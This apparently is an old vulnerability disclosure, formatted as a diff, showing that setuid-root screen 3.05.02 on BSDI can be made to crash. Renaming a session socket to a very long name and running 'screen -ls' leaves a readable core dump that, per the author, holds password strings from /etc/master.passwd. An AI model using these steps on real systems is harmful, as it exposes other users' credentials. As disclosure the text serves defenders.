@@ -1,0 +1,52 @@
+The program under question is /usr/contrib/bin/screen (BSDI).  This is
+screen version 3.05.02 and is installed setuid root, as it is "supposed"
+to be.  Here is a demonstration:
+
+$ screen
+
+Screen version 3.05.02 (FAU) 19-Aug-93
+
+Copyright (c) 1993 Juergen Weigert, Michael Schroeder
+Copyright (c) 1987 Oliver Laumann
+
+This program is free software; you can redistribute it and/or modify it under
+the terms of the GNU General Public License as published by the Free Software
+Foundation; either version 2, or (at your option) any later version.
+
+This program is distributed in the hope that it will be useful, but WITHOUT
+ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
+FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.
+
+You should have received a copy of the GNU General Public License along with
+this program (see the file COPYING); if not, write to the Free Software
+Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
+
+Send bugreports, fixes, enhancements, t-shirts, money, beer & pizza to
+screen@uni-erlangen.de (bah.. send them to Bugtraq!)
+
+                        [Press Space or Return to end.]
+
+$ screen
+
+$ cd /tmp/screens/S-khelbin
+$ ls
+246.ttyp7.comet
+$ mv 246.ttyp* 246.ttyp7.cometanonymousanonymousanonymousanonymous\
+> anonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymous\
+> anonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymous
+$ screen -ls
+/tmp/screens/S-khelbin/246.ttyp7.cometanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymous: connect: Invalid argument
+%1     278 Abort - core dumped  screen -ls
+$ ls -l
+total 176
+srwx------  1 khelbin  khelbin       0 Feb 15 21:33 246.ttyp7.cometanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymousanonymous
+-rw-r--r--  1 khelbin  khelbin  172032 Feb 15 21:33 core.screen
+$ strings core.screen|less
+
+
+The core.screen file contains unencrypted password strings from
+/etc/master.passwd, which of course, should not be readable by me.  I'm
+also sure there's a buffer-overflow here but I havn't had as much time as
+I would like to to look through the source yet.
+
+
